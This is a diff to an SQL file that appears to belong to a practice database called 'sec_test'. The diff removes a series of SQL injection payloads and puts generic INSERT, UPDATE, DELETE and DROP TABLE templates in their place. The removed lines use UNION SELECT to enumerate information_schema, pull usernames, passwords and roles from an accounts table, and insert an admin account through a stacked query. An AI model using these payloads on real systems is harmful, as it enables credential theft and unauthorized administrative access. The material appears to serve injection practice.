@@ -21,12 +21,14 @@ INSERT INTO `products`(`name`, `category`, `cost`) VALUES ('book2', 'book', 15);
 
 
 // 
- %' UNION SELECT TABLE_SCHEMA, 1, 2 FROM information_schema.TABLES WHERE TABLE_SCHEMA LIKE '%
+INSERT INTO table_name (column1, column2, column3, ...)
+VALUES (value1, value2, value3, ...);
 
-%' UNION SELECT TABLE_SCHEMA, TABLE_NAME, 2 FROM information_schema.TABLES WHERE TABLE_SCHEMA='sec_test' AND TABLE_NAME LIKE '%
+UPDATE table_name
+SET column1 = value1, column2 = value2, ...
+WHERE condition;
 
-%' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sec_test' AND TABLE_NAME='accounts' AND COLUMN_NAME LIKE '%
+DELETE FROM table_name WHERE condition;
 
-%' UNION SELECT username, password, role FROM sec_test.accounts WHERE username LIKE '%
+DROP TABLE table_name;
 
-%'; INSERT INTO sec_test.accounts (username, password, role) VALUES('temp1234', 'temp1234', 'admin'); #
